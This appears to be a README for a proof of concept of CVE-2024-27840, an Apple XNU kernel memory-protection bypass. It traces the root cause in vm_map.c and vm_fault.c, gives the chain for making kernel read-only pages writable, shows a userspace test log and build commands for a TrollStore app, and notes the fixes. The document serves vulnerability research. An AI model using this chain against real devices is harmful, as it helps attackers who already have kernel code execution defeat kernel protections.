# CVE-2024-27840 — Kernel Memory Protection Bypass

Patched in iOS 17.5 / macOS 14.5 (May 13, 2024). Affects all Apple platforms.

## Summary

| | |
|---|---|
| **CVE** | CVE-2024-27840 |
| **Type** | Kernel memory protection bypass |
| **Precondition** | Kernel code execution |
| **Impact** | Create writable mappings to kernel read-only pages |
| **Patched** | iOS 17.5 / macOS 14.5 |
| **Affects** | iOS ≤17.4, macOS ≤14.4, tvOS ≤17.4, watchOS ≤10.4, visionOS ≤1.1 |
| **Apple Description** | *"An attacker that has already achieved kernel code execution may be able to bypass kernel memory protections"* |

## Root Cause

Two-stage bug in XNU.

### Stage 1 — Missing `cur ≤ max` validation

`vm_map_enter_mem_object_helper()` in `osfmk/vm/vm_map.c` validates that `cur_protection` and `max_protection` have valid bits, but never checks that `cur_protection` is a subset of `max_protection`:

```c
// xnu-10063.101.15, vm_map.c:4172
if ((target_map == VM_MAP_NULL) ||
    (cur_protection & ~(VM_PROT_ALL | VM_PROT_ALLEXEC)) ||
    (max_protection & ~(VM_PROT_ALL | VM_PROT_ALLEXEC)) ||
    ...
    initial_size == 0) {
    return KERN_INVALID_ARGUMENT;
}
// NO CHECK: (cur_protection & max_protection) == cur_protection
```

A caller can create a mapping with `cur=RW, max=R` and the kernel accepts it.

**Fix** (xnu-10063.121.3, line 4196):
```c
if (__improbable((cur_protection & max_protection) != cur_protection)) {
    cur_protection &= max_protection;
}
```

### Stage 2 — Dead asserts in RELEASE builds

`vm_fault.c` contains `pmap_has_prot_policy()` checks that should enforce memory protection policies. But they were `assert()` calls:

```c
// Pre-fix: vm_fault.c
if (!pmap_has_prot_policy(pmap, ..., *prot)) {
    *prot &= ~VM_PROT_WRITE;
} else {
    assert(cs_bypass);  // ((void)0) in RELEASE builds
}
```

Apple ships RELEASE kernels where `MACH_ASSERT=0`. Every `assert()` expands to `((void)0)`. The protection policy check never executes on production devices.

**Fix**: 16 `assert()` calls converted to `if (...) panic(...)` which executes unconditionally.

### How it chains together

```
Kernel code execution
  → vm_map_enter_mem_object(kernel_map, cur=RW, max=R)
    → No cur⊆max validation → mapping created
      → Page fault → pmap_has_prot_policy() returns TRUE
        → assert(cs_bypass) → ((void)0) → skipped
          → PTE created with write permission
            → Kernel read-only page now writable
```

From userspace, you can only target your own address space (not useful). The real impact requires kernel code execution to target `kernel_map`.

### SPTM note

On SPTM devices (A15+, iOS 17+), pages typed as `XNU_DEFAULT` (majority of kernel memory) are vulnerable. SPTM-typed pages have hardware-enforced protections that need additional bypasses.

## On-Device Test

Tested on iPhone 13 Pro Max (iPhone14,3), iOS 17.0 (21A329). Sideloaded via Xcode — fully sandboxed, no special entitlements. Also tested via TrollStore with identical results.

The userspace test maps the app's own memory with `cur>max` to confirm the kernel accepts it and creates a writable PTE. It does not touch kernel memory.

```
mach_vm_map(task, &addr, 0x4000, 0, ANYWHERE,
  port=0x610b, off=0, copy=NO,
  cur=RW(0x3), max=R(0x1), NONE) = 0x0
  -> addr = 0x100bdc000

write *(char*)0x100bdc000 = 'B' ...
  -> write OK (no fault)
read *(char*)0x100bd8000 = 0x42 ('B')
  -> original page changed: same physical page

VULNERABLE — wrote through cur>max mapping

mach_vm_protect(0x100bdc000, RW) = 0x2 ((os/kern) protection failure)
```

Key observations:
- `mach_vm_map` accepts `cur > max` without returning an error
- Write through the mapping succeeds — PTE was created with write permission
- Original page modified — same physical page, not copy-on-write
- `mach_vm_protect` to RW correctly fails — the protect path enforces `max_protection`, but the initial mapping path does not

On patched systems (tested macOS 26.4): `mach_vm_map` returns success but `cur_protection` is silently clamped to `max_protection`. Write faults with SIGBUS.

## Files

| File | Description |
|---|---|
| `poc.c` | Full PoC — kernel-context exploit pseudocode + compilable userspace demo |
| `ios_test_app.m` | iOS app source (UIKit) for on-device testing |
| `Info.plist` | App bundle metadata |
| `CVE27840App.ipa` | Pre-built .ipa (ldid signed, TrollStore compatible) |

## Building the iOS App

```bash
xcrun --sdk iphoneos clang -target arm64-apple-ios15.0 \
  -isysroot "$(xcrun --sdk iphoneos --show-sdk-path)" \
  -framework UIKit -framework Foundation -framework CoreGraphics \
  -fobjc-arc -O2 -o CVE27840App.app/CVE27840App ios_test_app.m

ldid -S CVE27840App.app/CVE27840App

mkdir Payload && cp -r CVE27840App.app Payload/
zip -r CVE27840App.ipa Payload/
```

Install via TrollStore on iOS ≤17.4, or sideload via Xcode.

## XNU Source References

- Pre-patch: [`xnu-10063.101.15`](https://github.com/apple-oss-distributions/xnu/tree/xnu-10063.101.15)
- Post-patch: [`xnu-10063.121.3`](https://github.com/apple-oss-distributions/xnu/tree/xnu-10063.121.3)
- Key files: `osfmk/vm/vm_map.c`, `osfmk/vm/vm_fault.c`

## Disclaimer

For educational and defensive security research only. The userspace PoC operates on the calling process's own memory. It cannot access kernel memory, cause data loss, or trigger kernel panics.
